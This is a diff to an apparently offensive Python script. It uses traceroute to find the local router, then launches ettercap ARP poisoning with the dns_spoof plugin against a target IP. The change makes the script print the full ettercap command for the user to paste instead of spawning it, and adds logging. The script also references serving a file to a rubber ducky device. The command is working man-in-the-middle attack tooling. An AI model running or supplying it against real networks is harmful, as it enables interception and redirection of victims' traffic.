@@ -1,4 +1,4 @@
-import nclib, os, sys
+import nclib, os, sys, subprocess
 # Takes target IP as 2nd argument
 
 # Check if localhost has the script file for curling by the rubberducky
@@ -27,7 +27,9 @@ ipoutput=os.popen("traceroute 8.8.8.8").read()
 routerip=ipoutput.split("\n")[1].split("(")[1].split(")")[0]
 print(routerip)
 try:
-    os.spawnl(os.P_DETACH,f'sudo ettercap -D -M arp:remote -P dns_spoof -q -T  /{routerip}// /{sys.argv[1]}//')
+    print("Open a new terminal and paste this in:\n")
+    print(f'sudo ettercap -M arp:remote -P dns_spoof -q -T /{routerip}// /{sys.argv[1]}// -m log.txt')
+    input("\nHit enter to continue")
 except:
     print("Please provide a target IP")
     
